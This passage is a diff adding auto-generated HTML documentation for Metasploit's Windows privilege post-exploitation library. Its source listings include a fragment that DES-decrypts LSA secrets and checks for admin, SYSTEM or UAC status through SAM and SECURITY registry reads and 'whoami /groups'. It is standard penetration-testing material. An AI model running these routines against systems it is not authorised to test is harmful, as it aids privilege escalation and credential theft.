+    <span class='id identifier rubyid_enc_block'>enc_block</span> <span class='op'>=</span> <span class='id identifier rubyid_secret'>secret</span><span class='lbracket'>[</span><span class='id identifier rubyid_i'>i</span><span class='op'>..</span><span class='id identifier rubyid_i'>i</span><span class='op'>+</span><span class='int'>7</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_block_key'>block_key</span> <span class='op'>=</span> <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='id identifier rubyid_j'>j</span><span class='op'>..</span><span class='id identifier rubyid_j'>j</span><span class='op'>+</span><span class='int'>6</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_des_key'>des_key</span> <span class='op'>=</span> <span class='id identifier rubyid_convert_des_56_to_64'>convert_des_56_to_64</span><span class='lparen'>(</span><span class='id identifier rubyid_block_key'>block_key</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_d1'>d1</span> <span class='op'>=</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>Cipher</span><span class='op'>::</span><span class='const'>Cipher</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>des-ecb</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+
+    <span class='id identifier rubyid_d1'>d1</span><span class='period'>.</span><span class='id identifier rubyid_padding'>padding</span> <span class='op'>=</span> <span class='int'>0</span>
+    <span class='id identifier rubyid_d1'>d1</span><span class='period'>.</span><span class='id identifier rubyid_key'>key</span> <span class='op'>=</span> <span class='id identifier rubyid_des_key'>des_key</span>
+    <span class='id identifier rubyid_d1o'>d1o</span> <span class='op'>=</span> <span class='id identifier rubyid_d1'>d1</span><span class='period'>.</span><span class='id identifier rubyid_update'>update</span><span class='lparen'>(</span><span class='id identifier rubyid_enc_block'>enc_block</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_d1o'>d1o</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_d1'>d1</span><span class='period'>.</span><span class='id identifier rubyid_final'>final</span>
+    <span class='id identifier rubyid_decrypted_data'>decrypted_data</span> <span class='op'>+=</span> <span class='id identifier rubyid_d1o'>d1o</span>
+    <span class='id identifier rubyid_j'>j</span> <span class='op'>+=</span> <span class='int'>7</span>
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='id identifier rubyid_j'>j</span><span class='op'>..</span><span class='id identifier rubyid_j'>j</span><span class='op'>+</span><span class='int'>7</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>&lt;</span> <span class='int'>7</span> <span class='rparen'>)</span>
+      <span class='id identifier rubyid_j'>j</span> <span class='op'>=</span> <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='id identifier rubyid_j'>j</span><span class='op'>..</span><span class='id identifier rubyid_j'>j</span><span class='op'>+</span><span class='int'>7</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_dec_data_len'>dec_data_len</span> <span class='op'>=</span> <span class='id identifier rubyid_decrypted_data'>decrypted_data</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_ord'>ord</span>
+
+  <span class='kw'>return</span> <span class='id identifier rubyid_decrypted_data'>decrypted_data</span><span class='lbracket'>[</span><span class='int'>8</span><span class='op'>..</span><span class='int'>8</span><span class='op'>+</span><span class='id identifier rubyid_dec_data_len'>dec_data_len</span><span class='rbracket'>]</span>
+
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_integrity_level-instance_method">
+  
+    - (<tt>Object</tt>) <strong>get_integrity_level</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the Integrity Level</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 135</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_integrity_level'>get_integrity_level</span>
+  <span class='id identifier rubyid_whoami'>whoami</span> <span class='op'>=</span> <span class='id identifier rubyid_get_whoami'>get_whoami</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_whoami'>whoami</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+    <span class='id identifier rubyid_print_error'>print_error</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Unable to identify integrity level</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='kw'>return</span> <span class='kw'>nil</span>
+  <span class='kw'>else</span>
+    <span class='const'>INTEGRITY_LEVEL_SID</span><span class='period'>.</span><span class='id identifier rubyid_each_pair'>each_pair</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_k'>k</span><span class='comma'>,</span><span class='id identifier rubyid_sid'>sid</span><span class='op'>|</span>
+      <span class='kw'>if</span> <span class='id identifier rubyid_whoami'>whoami</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span> <span class='id identifier rubyid_sid'>sid</span>
+        <span class='kw'>return</span> <span class='id identifier rubyid_sid'>sid</span>
+      <span class='kw'>end</span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_uac_level-instance_method">
+  
+    - (<tt>Object</tt>) <strong>get_uac_level</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the UAC Level</p>
+
+<p>2 - Always Notify, 5 - Default, 0 - Disabled</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+  <p class="tag_title">See Also:</p>
+  <ul class="see">
+    
+      <li><a href="http://technet.microsoft.com/en-us/library/dd835564(v=ws.10).aspx" target="_parent" title="http://technet.microsoft.com/en-us/library/dd835564(v=ws.10).aspx">http://technet.microsoft.com/en-us/library/dd835564(v=ws.10).aspx</a></li>
+    
+  </ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 115</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_uac_level'>get_uac_level</span>
+  <span class='kw'>begin</span>
+    <span class='id identifier rubyid_uac_level'>uac_level</span> <span class='op'>=</span> <span class='id identifier rubyid_registry_getvaldata'>registry_getvaldata</span><span class='lparen'>(</span>
+        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ConsentPromptBehaviorAdmin</span><span class='tstring_end'>&#39;</span></span>
+    <span class='rparen'>)</span>
+  <span class='kw'>rescue</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Post</span><span class='op'>::</span><span class='const'>Meterpreter</span><span class='op'>::</span><span class='const'>RequestError</span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_e'>e</span>
+    <span class='id identifier rubyid_print_error'>print_error</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Error Checking UAC Level: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_e'>e</span><span class='period'>.</span><span class='id identifier rubyid_class'>class</span><span class='embexpr_end'>}</span><span class='tstring_content'> </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_e'>e</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_uac_level'>uac_level</span>
+    <span class='kw'>return</span> <span class='id identifier rubyid_uac_level'>uac_level</span>
+  <span class='kw'>else</span>
+    <span class='kw'>return</span> <span class='kw'>nil</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_whoami-instance_method">
+  
+    - (<tt>Object</tt>) <strong>get_whoami</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the output of whoami /groups</p>
+
+<p>Returns nil if Windows whoami is not available</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 155</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_whoami'>get_whoami</span>
+  <span class='id identifier rubyid_whoami'>whoami</span> <span class='op'>=</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>cmd.exe /c whoami /groups</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_whoami'>whoami</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span> <span class='kw'>or</span> <span class='id identifier rubyid_whoami'>whoami</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+    <span class='kw'>return</span> <span class='kw'>nil</span>
+  <span class='kw'>elsif</span> <span class='id identifier rubyid_whoami'>whoami</span> <span class='op'>=~</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>is not recognized</span><span class='regexp_end'>/</span></span> <span class='kw'>or</span> <span class='id identifier rubyid_whoami'>whoami</span> <span class='op'>=~</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>extra operand</span><span class='regexp_end'>/</span></span> <span class='kw'>or</span> <span class='id identifier rubyid_whoami'>whoami</span> <span class='op'>=~</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>Access is denied</span><span class='regexp_end'>/</span></span>
+    <span class='kw'>return</span> <span class='kw'>nil</span>
+  <span class='kw'>else</span>
+    <span class='kw'>return</span> <span class='id identifier rubyid_whoami'>whoami</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="is_admin?-instance_method">
+  
+    - (<tt>Boolean</tt>) <strong>is_admin?</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns true if user is admin and false if not.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Boolean</tt>)</span>
+      
+      
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 32</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_is_admin?'>is_admin?</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_session_has_ext'>session_has_ext</span>
+    <span class='comment'># Assume true if the OS doesn&#39;t expose this (Windows 2000)
+</span>    <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_railgun'>railgun</span><span class='period'>.</span><span class='id identifier rubyid_shell32'>shell32</span><span class='period'>.</span><span class='const'>IsUserAnAdmin</span><span class='lparen'>(</span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>return</span><span class='tstring_end'>&quot;</span></span><span class='rbracket'>]</span> <span class='kw'>rescue</span> <span class='kw'>true</span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_local_service_key'>local_service_key</span> <span class='op'>=</span> <span class='id identifier rubyid_registry_enumkeys'>registry_enumkeys</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HKU\S-1-5-19</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='kw'>if</span> <span class='id identifier rubyid_local_service_key'>local_service_key</span>
+      <span class='kw'>return</span> <span class='kw'>true</span>
+    <span class='kw'>else</span>
+      <span class='kw'>return</span> <span class='kw'>false</span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="is_in_admin_group?-instance_method">
+  
+    - (<tt>Boolean</tt>) <strong>is_in_admin_group?</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns true if in the administrator group</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Boolean</tt>)</span>
+      
+      
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 49</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_is_in_admin_group?'>is_in_admin_group?</span>
+  <span class='id identifier rubyid_whoami'>whoami</span> <span class='op'>=</span> <span class='id identifier rubyid_get_whoami'>get_whoami</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_whoami'>whoami</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+    <span class='id identifier rubyid_print_error'>print_error</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Unable to identify admin group membership</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='kw'>return</span> <span class='kw'>nil</span>
+  <span class='kw'>elsif</span> <span class='id identifier rubyid_whoami'>whoami</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span> <span class='const'>ADMINISTRATORS_SID</span>
+    <span class='kw'>return</span> <span class='kw'>true</span>
+  <span class='kw'>else</span>
+    <span class='kw'>return</span> <span class='kw'>false</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="is_system?-instance_method">
+  
+    - (<tt>Boolean</tt>) <strong>is_system?</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns true if running as Local System</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Boolean</tt>)</span>
+      
+      
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 65</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_is_system?'>is_system?</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_session_has_ext'>session_has_ext</span>
+    <span class='id identifier rubyid_local_sys'>local_sys</span> <span class='op'>=</span> <span class='id identifier rubyid_resolve_sid'>resolve_sid</span><span class='lparen'>(</span><span class='const'>SYSTEM_SID</span><span class='rparen'>)</span>
+    <span class='kw'>if</span> <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_sys'>sys</span><span class='period'>.</span><span class='id identifier rubyid_config'>config</span><span class='period'>.</span><span class='id identifier rubyid_getuid'>getuid</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_local_sys'>local_sys</span><span class='lbracket'>[</span><span class='symbol'>:domain</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_local_sys'>local_sys</span><span class='lbracket'>[</span><span class='symbol'>:name</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+      <span class='kw'>return</span> <span class='kw'>true</span>
+    <span class='kw'>else</span>
+      <span class='kw'>return</span> <span class='kw'>false</span>
+    <span class='kw'>end</span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_results'>results</span> <span class='op'>=</span> <span class='id identifier rubyid_registry_enumkeys'>registry_enumkeys</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HKLM\SAM\SAM</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='kw'>if</span> <span class='id identifier rubyid_results'>results</span>
+      <span class='kw'>return</span> <span class='kw'>true</span>
+    <span class='kw'>else</span>
+      <span class='kw'>return</span> <span class='kw'>false</span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="is_uac_enabled?-instance_method">
+  
+    - (<tt>Boolean</tt>) <strong>is_uac_enabled?</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns true if UAC is enabled</p>
+
+<p>Returns false if the session is running as system, if uac is disabled or if
+running on a system that does not have UAC</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Boolean</tt>)</span>
+      
+      
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 89</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_is_uac_enabled?'>is_uac_enabled?</span>
+  <span class='id identifier rubyid_uac'>uac</span> <span class='op'>=</span> <span class='kw'>false</span>
+  <span class='id identifier rubyid_winversion'>winversion</span> <span class='op'>=</span> <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_sys'>sys</span><span class='period'>.</span><span class='id identifier rubyid_config'>config</span><span class='period'>.</span><span class='id identifier rubyid_sysinfo'>sysinfo</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>OS</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_winversion'>winversion</span> <span class='op'>=~</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>Windows (Vista|7|8|2008)</span><span class='regexp_end'>/</span></span>
+    <span class='kw'>unless</span> <span class='id identifier rubyid_is_system?'>is_system?</span>
+      <span class='kw'>begin</span>
+        <span class='id identifier rubyid_enable_lua'>enable_lua</span> <span class='op'>=</span> <span class='id identifier rubyid_registry_getvaldata'>registry_getvaldata</span><span class='lparen'>(</span>
+            <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+            <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>EnableLUA</span><span class='tstring_end'>&#39;</span></span>
+        <span class='rparen'>)</span>
+        <span class='id identifier rubyid_uac'>uac</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='id identifier rubyid_enable_lua'>enable_lua</span> <span class='op'>==</span> <span class='int'>1</span><span class='rparen'>)</span>
+      <span class='kw'>rescue</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Post</span><span class='op'>::</span><span class='const'>Meterpreter</span><span class='op'>::</span><span class='const'>RequestError</span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_e'>e</span>
+        <span class='id identifier rubyid_print_error'>print_error</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Error Checking if UAC is Enabled: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_e'>e</span><span class='period'>.</span><span class='id identifier rubyid_class'>class</span><span class='embexpr_end'>}</span><span class='tstring_content'> </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_e'>e</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+      <span class='kw'>end</span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_uac'>uac</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="lsa_vista_style?-instance_method">
+  
+    - (<tt>Boolean</tt>) <strong>lsa_vista_style?</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Whether this system has Vista-style secret keys</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Boolean</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>True if this session has keys in the PolEKList registry key, false
+otherwise.</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+294
+295
+296
+297
+298
+299
+300</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 294</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_lsa_vista_style?'>lsa_vista_style?</span>
+  <span class='kw'>if</span> <span class='ivar'>@lsa_vista_style</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+    <span class='ivar'>@lsa_vista_style</span> <span class='op'>=</span> <span class='op'>!</span><span class='op'>!</span><span class='lparen'>(</span><span class='id identifier rubyid_registry_getvaldata'>registry_getvaldata</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>HKLM\\SECURITY\\Policy\\PolEKList</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='ivar'>@lsa_vista_style</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="session_has_ext-instance_method">
+  
+    - (<tt>Object</tt>) <strong>session_has_ext</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Return true if the session has extended capabilities (ie meterpreter)</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+170
+171
+172
+173
+174
+175
+176</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 170</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_session_has_ext'>session_has_ext</span>
+  <span class='kw'>begin</span>
+    <span class='kw'>return</span> <span class='op'>!</span><span class='op'>!</span><span class='lparen'>(</span><span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_railgun'>railgun</span> <span class='kw'>and</span> <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_sys'>sys</span><span class='period'>.</span><span class='id identifier rubyid_config'>config</span><span class='rparen'>)</span>
+  <span class='kw'>rescue</span> <span class='const'>NoMethodError</span>
+    <span class='kw'>return</span> <span class='kw'>false</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+    <div id="footer">
+  Generated on Wed Sep  3 01:51:11 2014 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.8.7.4 (ruby-2.1.2).
+</div>
+
+  </body>
+</html>
